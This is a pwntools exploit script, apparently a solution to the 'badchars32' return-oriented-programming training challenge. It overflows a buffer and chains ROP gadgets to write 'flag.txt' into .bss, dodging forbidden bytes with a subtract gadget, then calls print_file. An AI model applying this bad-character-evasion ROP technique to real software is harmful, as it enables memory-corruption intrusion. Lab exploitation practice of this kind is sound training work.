from pwn import *

DEBUG = False

elf = ELF("./badchars32")
gs = """
b *pwnme+273
b *print_file
"""
if DEBUG:
    io = gdb.debug(elf.path, gdbscript=gs)
else:
    io = process(elf.path)

# found using ropper
pop_esi_edi_ebp = 0x080485b9   # pop esi; pop edi; pop ebp; ret;
mov_memo_edi_esi = 0x0804854f  # mov dword ptr [edi], esi; ret;
pop_ebp = 0x080485bb           # pop ebp; ret;
pop_ebx = 0x0804839d           # pop ebx; ret;
sub_memo_ebp_bl = 0x0804854b   # sub byte ptr [ebp], bl; ret;

bytes_str = b"flag.txt\0"
badchars = b'xga.'
badchars_marker = 0xEB  # All the badchars will be replaced with this value.
write_loc = 0x0804a020  # .bss
offset = 44
payload = cyclic(offset)

chunk_size = 4  # 32 bits = 4 bytes per write.
for i in range(0, len(bytes_str), chunk_size):
    payload += p32(pop_esi_edi_ebp)
    payload += bytes_str[i: i+chunk_size].ljust(chunk_size, b'\0') 
    payload += p32(write_loc + i) + b'AAAA' + p32(mov_memo_edi_esi)

for i, byte in enumerate(bytes_str):
    if byte in badchars:
        payload += p32(pop_ebp) + p32(write_loc + i)
        payload += p32(pop_ebx) + p32(0xAABBCC00 | badchars_marker - byte)
        payload += p32(sub_memo_ebp_bl)

payload += p32(elf.sym.print_file) + b'AAAA' + p32(write_loc)

io.sendline(payload)
io.wait()  # for debugging in gdb
io.recvuntil("Thank you!\n")
print(io.recv())
